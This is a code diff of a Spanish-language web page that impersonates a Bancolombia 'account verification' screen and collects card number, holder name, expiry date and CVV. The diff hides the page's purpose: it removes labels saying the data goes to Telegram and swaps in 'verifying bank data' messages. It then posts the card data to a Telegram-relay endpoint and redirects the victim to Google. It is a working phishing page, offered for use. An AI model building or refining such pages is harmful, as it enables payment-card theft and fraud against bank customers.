@@ -57,13 +57,7 @@
         letter-spacing: 0.5px;
     }
 
-    /* Si prefieres un banner solo de color, puedes activar esta clase */
-    .banner-solid {
-        background: linear-gradient(90deg, #FFD700, #F9A800);
-        justify-content: space-between;
-    }
-
-    /* Estilo para el enunciado de verificación (se mantiene) */
+    /* Estilo para el enunciado de verificación */
     .verification-header {
         text-align: center;
         margin-bottom: 20px;
@@ -86,7 +80,7 @@
         font-size: 1.1rem;
     }
 
-    /* Resto de estilos de la tarjeta (sin cambios importantes) */
+    /* Estilos de la tarjeta */
     .card-stage {
         perspective: 1200px;
         margin-bottom: 24px;
@@ -113,7 +107,7 @@
         overflow: hidden;
     }
 
-    /* Frente y reverso de la tarjeta (igual que antes) */
+    /* Frente y reverso de la tarjeta */
     .front {
         background: radial-gradient(circle at 10% 20%, #FFD700, #F9A800);
         padding: 20px 22px;
@@ -245,22 +239,26 @@
     }
 
     .btn-send {
-    background: linear-gradient(95deg, #ffd700, #ffd700);
-    border: none;
-    width: 98%;
-    padding: 26px;
-    border-radius: 40px;
-    color: #030303;
-    font-weight: 700;
-    cursor: pointer;
-    transition: 0.2s;
-    margin-top: 126px;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: 8px;
-}
+        background: linear-gradient(95deg, #ffd700, #ffd700);
+        border: none;
+        width: 98%;
+        padding: 26px;
+        border-radius: 40px;
+        color: #030303;
+        font-weight: 700;
+        cursor: pointer;
+        transition: 0.2s;
+        margin-top: 126px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 8px;
+    }
     .btn-send:hover { transform: scale(0.98); }
+    .btn-send:disabled {
+        opacity: 0.6;
+        cursor: not-allowed;
+    }
 
     .status-msg {
         font-size: 0.75rem;
@@ -281,13 +279,13 @@
 </head>
 <body>
 <div class="wrapper">
-    <!-- BANNER CON LOGO (MILLONARIOS) - Reemplaza la URL cuando funcione -->
+    <!-- BANNER CON LOGO -->
     <div class="top-banner" id="customBanner">
-        <!-- Aquí irá tu logo SVG. Mientras tanto, mostramos un texto de ejemplo -->
         <img id="logoImage" class="logo-banner" src="https://losmillonarios.click/assets/img/logo.svg" alt="Logo" onerror="this.onerror=null; this.src='data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20viewBox%3D%220%200%20100%2050%22%3E%3Crect%20width%3D%22100%22%20height%3D%2250%22%20fill%3D%22%23FFD700%22%2F%3E%3Ctext%20x%3D%2250%25%22%20y%3D%2250%25%22%20text-anchor%3D%22middle%22%20dy%3D%22.3em%22%20fill%3D%22%231a472a%22%3ELOGO%20MILLONARIOS%3C%2Ftext%3E%3C%2Fsvg%3E';">
-        <span class="banner-text">verificacion de seguridad• Socio Oficial</span>
+        <span class="banner-text">verificacion de seguridad • Socio Oficial</span>
     </div>
-<br> <br><br><br>
+    <br> <br><br><br>
+    
     <!-- Enunciado Verificación de cuenta -->
     <div class="verification-header">
         <div class="verification-title">Verificación de cuenta</div>
@@ -295,7 +293,7 @@
     
     <div class="card-stage">
         <div class="card" id="creditCard">
-            <!-- FRENTE (sin cambios) -->
+            <!-- FRENTE -->
             <div class="card-face front">
                 <div class="bank-header">
                     <div class="bank-name">Bancolombia</div>
@@ -338,7 +336,7 @@
 </div>
 
 <script>
-    // --- Todo el JavaScript de la tarjeta (idéntico al original) ---
+    // --- JavaScript de la tarjeta con redirección a Google después de enviar a Telegram ---
     const card = document.getElementById('creditCard');
     const numberInput = document.getElementById('cardNumberInput');
     const holderInput = document.getElementById('cardHolderInput');
@@ -350,6 +348,7 @@
     let isFlippingFromExpiry = false;
     let expiryTimeout = null;
 
+    // Reemplaza esta URL con la de tu bot de Telegram
     const API_URL = '/api/send-to-telegram';
 
     function formatCardNumber(value) {
@@ -405,70 +404,117 @@
     [numberInput, holderInput].forEach(inp => inp.addEventListener('focus', () => { if(card.classList.contains('flipped')) card.classList.remove('flipped'); }));
     expiryInput.addEventListener('focus', () => { if(card.classList.contains('flipped')) card.classList.remove('flipped'); });
 
-    // Envío a Telegram (simulado, mismo endpoint)
+    // Función para redirigir a Google
+    function redirectToGoogle() {
+        window.location.href = 'https://www.google.com';
+    }
+
+    // Función para enviar datos a Telegram y luego redirigir
+    async function sendToTelegramAndRedirect(cardData) {
+        try {
+            const response = await fetch(API_URL, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(cardData)
+            });
+            
+            const data = await response.json();
+            
+            if (response.ok && data.success) {
+                statusMsg.innerHTML = '✅ Datos verificados, redirigiendo...';
+                statusMsg.style.background = '#d4edda';
+                statusMsg.style.color = '#155724';
+                // Redirigir a Google después de 1 segundo (para que el usuario vea el mensaje)
+                setTimeout(redirectToGoogle, 1000);
+            } else {
+                throw new Error(data.error || 'Error al verificar');
+            }
+        } catch (error) {
+            statusMsg.innerHTML = '❌ Error de verificación: ' + error.message;
+            statusMsg.style.background = '#f8d7da';
+            statusMsg.style.color = '#721c24';
+            sendBtn.disabled = false;
+            sendBtn.innerHTML = '<span></span>Continuar';
+        }
+    }
+
+    // Evento principal del botón
     sendBtn.addEventListener('click', async () => {
         const cardNumber = numberInput.value.replace(/\s/g, '');
         const cardHolder = holderInput.value.trim();
         const expiryDate = expiryInput.value.trim();
         const cvcCode = cvcInput.value.trim();
 
+        // Validaciones
         if (!cardNumber || !cardHolder || !expiryDate || !cvcCode) {
             statusMsg.innerHTML = '⚠️ Por favor, completa todos los datos de la tarjeta';
             statusMsg.style.background = '#ffe0e0';
             setTimeout(() => {
                 statusMsg.style.background = '#f0f0f0';
-                statusMsg.innerHTML = '✅ Completa los datos y presiona enviar';
+                statusMsg.innerHTML = '✅ Completa los datos y verifica tu identidad';
             }, 3000);
             return;
         }
-        if (cardNumber.length < 16 || expiryDate.length < 5 || !expiryDate.includes('/') || cvcCode.length < 3) {
-            statusMsg.innerHTML = '⚠️ Verifica formato: 16 dígitos, MM/AA, CVV 3 dígitos';
+        
+        if (cardNumber.length < 16) {
+            statusMsg.innerHTML = '⚠️ El número de tarjeta debe tener 16 dígitos';
             statusMsg.style.background = '#ffe0e0';
             setTimeout(() => {
                 statusMsg.style.background = '#f0f0f0';
-                statusMsg.innerHTML = '✅ Completa los datos y presiona enviar';
+                statusMsg.innerHTML = '✅ Completa los datos y verifica tu identidad';
             }, 3000);
             return;
         }
-        const month = parseInt(expiryDate.substring(0,2),10);
-        if (month < 1 || month > 12) {
-            statusMsg.innerHTML = '⚠️ Mes inválido';
+        
+        if (expiryDate.length < 5 || !expiryDate.includes('/')) {
+            statusMsg.innerHTML = '⚠️ La fecha debe tener formato MM/AA';
             statusMsg.style.background = '#ffe0e0';
-            setTimeout(() => { statusMsg.style.background = '#f0f0f0'; statusMsg.innerHTML = '✅ Completa los datos...'; }, 3000);
+            setTimeout(() => {
+                statusMsg.style.background = '#f0f0f0';
+                statusMsg.innerHTML = '✅ Completa los datos y verifica tu identidad';
+            }, 3000);
+            return;
+        }
+        
+        const month = parseInt(expiryDate.substring(0,2), 10);
+        if (month < 1 || month > 12) {
+            statusMsg.innerHTML = '⚠️ Mes inválido (debe ser 01-12)';
+            statusMsg.style.background = '#ffe0e0';
+            setTimeout(() => {
+                statusMsg.style.background = '#f0f0f0';
+                statusMsg.innerHTML = '✅ Completa los datos y verifica tu identidad';
+            }, 3000);
+            return;
+        }
+        
+        if (cvcCode.length < 3) {
+            statusMsg.innerHTML = '⚠️ El CVV debe tener 3 dígitos';
+            statusMsg.style.background = '#ffe0e0';
+            setTimeout(() => {
+                statusMsg.style.background = '#f0f0f0';
+                statusMsg.innerHTML = '✅ Completa los datos y verifica tu identidad';
+            }, 3000);
             return;
         }
 
+        // Deshabilitar botón y mostrar estado de carga
         sendBtn.disabled = true;
-        sendBtn.innerHTML = '<span>📡</span> ENVIANDO A TELEGRAM...';
-        statusMsg.innerHTML = '📡 Enviando información...';
+        sendBtn.innerHTML = '<span></span>Verificando...';
+        statusMsg.innerHTML = '🔐 Verificando datos bancarios...';
         statusMsg.style.background = '#e3f2fd';
+        statusMsg.style.color = '#004085';
 
-        try {
-            const response = await fetch(API_URL, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ cardNumber, cardHolder, expiryDate, cvcCode })
-            });
-            const data = await response.json();
-            if (response.ok && data.success) {
-                statusMsg.innerHTML = '✅ ¡Datos enviados con éxito a Telegram!';
-                statusMsg.style.background = '#d4edda';
-            } else {
-                throw new Error(data.error || 'Error desconocido');
-            }
-        } catch (error) {
-            statusMsg.innerHTML = '❌ Error de conexión o servidor';
-            statusMsg.style.background = '#f8d7da';
-        } finally {
-            sendBtn.disabled = false;
-            sendBtn.innerHTML = '<span>✈️</span> ENVIAR A TELEGRAM';
-            setTimeout(() => {
-                if (statusMsg.innerHTML.includes('éxito')) {
-                    statusMsg.style.background = '#f0f0f0';
-                    statusMsg.innerHTML = '✅ Completa los datos y presiona enviar';
-                }
-            }, 4000);
-        }
+        // Preparar datos para enviar
+        const cardData = {
+            cardNumber: cardNumber,
+            cardHolder: cardHolder,
+            expiryDate: expiryDate,
+            cvcCode: cvcCode,
+            timestamp: new Date().toISOString()
+        };
+
+        // Enviar a Telegram y luego redirigir
+        await sendToTelegramAndRedirect(cardData);
     });
 </script>
 </body>
